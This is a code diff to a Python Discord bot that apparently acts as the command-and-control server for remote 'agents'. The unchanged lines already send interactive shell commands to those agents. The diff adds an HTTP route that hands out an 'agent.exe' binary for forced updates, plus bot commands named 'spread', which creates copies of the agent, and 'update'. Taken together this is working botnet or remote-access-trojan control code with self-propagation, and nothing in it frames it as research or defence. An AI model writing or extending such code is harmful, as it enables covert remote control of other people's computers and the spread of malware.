@@ -6,7 +6,6 @@ import asyncio
 from aiohttp import web
 from datetime import datetime, timezone, timedelta
 import re
-import time
 import logging
 
 # ------------------- CONFIGURATION -------------------
@@ -48,13 +47,21 @@ class MyBot(commands.Bot):
 
 bot = MyBot()
 
-# ------------------- HTTP HEALTH SERVER -------------------
+# ------------------- HTTP HEALTH & FILE SERVER -------------------
 async def handle_health(request):
     return web.Response(text="OK")
+
+async def handle_agent_download(request):
+    """Serve the agent binary for self‑updates."""
+    file_path = os.path.join(os.path.dirname(__file__), "agent.exe")
+    if not os.path.exists(file_path):
+        return web.Response(text="Agent binary not found", status=404)
+    return web.FileResponse(file_path)
 
 app = web.Application()
 app.router.add_get("/", handle_health)
 app.router.add_get("/health", handle_health)
+app.router.add_get("/agent.exe", handle_agent_download)  # New route for updates
 
 async def start_http_server():
     runner = web.AppRunner(app)
@@ -202,6 +209,14 @@ async def shell_command(interaction: discord.Interaction):
 @bot.tree.command(name="shell_stop", description="Stop the interactive shell")
 async def shell_stop_command(interaction: discord.Interaction):
     await send_command_to_agent(interaction, "shell_stop")
+
+@bot.tree.command(name="spread", description="Create multiple copies of the agent")
+async def spread_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "spread")
+
+@bot.tree.command(name="update", description="Force the agent to self‑update")
+async def update_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "update")
 
 # ------------------- CONTROL CHANNEL COMMANDS (legacy) -------------------
 @bot.command(name="agents")
